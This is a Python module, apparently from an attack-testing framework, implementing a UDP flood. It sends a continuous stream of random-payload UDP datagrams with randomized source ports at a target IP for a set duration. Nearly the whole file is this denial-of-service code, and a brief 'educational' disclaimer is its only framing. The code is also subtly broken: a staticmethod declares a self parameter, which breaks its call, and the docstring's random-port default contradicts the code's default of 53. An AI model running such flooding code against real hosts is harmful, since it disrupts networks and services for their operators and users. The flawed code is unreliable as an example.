"""
UDPFlood.py

Implements a UDP-flood attack

Parameter summary
+-------------+--------+--------------------------------------------------+
| parameter   | type   | default / purpose                                |
+-------------+--------+--------------------------------------------------+
| target_port | int    | None - if omitted the attack picks a random      |
|             |        |              destination port for every packet   |
|             |        |              (using Scapy's RandShort()).        |
|             |        |            | Provide an int (for example 53)     |
|             |        |              to force all packets to that port.  |
| duration    | int    | 10    - attack runtime in seconds                |
| packet_size | int    | 512   - UDP payload bytes (hard-capped at 1500)  |
+-------------+--------+--------------------------------------------------+

DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.
"""

import random
import time
from typing import Optional

from scapy.all import IP, UDP, Raw, RandShort, send

from attacks.attack import Attack

class UDPFlood(Attack):
    """Send a continuous stream of random UDP datagrams to the victim."""

    _MAX_SIZE = 1500  # stay below common Ethernet MTU
    # ------------------------------------------------------------------ #
    def execute(self) -> None:
        self.wait_until_start()

        port      = int(self.parameters.get("target_port", 53))
        duration  = int(self.parameters.get("duration", 10))
        payload_n = min(int(self.parameters.get("packet_size", 512)),self._MAX_SIZE)

        self._udp_flood(self.target_ip, port, duration, payload_n)

    # ------------------------------------------------------------------ #
    @staticmethod
    def _udp_flood(self,target_ip: str,fixed_port: Optional[int],duration: int,size: int) -> None:
        """
        Transmit UDP datagrams for *duration* seconds.
        The payload is a static random byte-string to avoid repeated allocation overhead.
        """
        payload  = Raw(bytes(random.getrandbits(8) for _ in range(size)))
        end_time = time.time() + duration

        while time.time() < end_time:
            dport = fixed_port if fixed_port is not None else RandShort()
            packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=dport) / payload
            send(packet, verbose=0)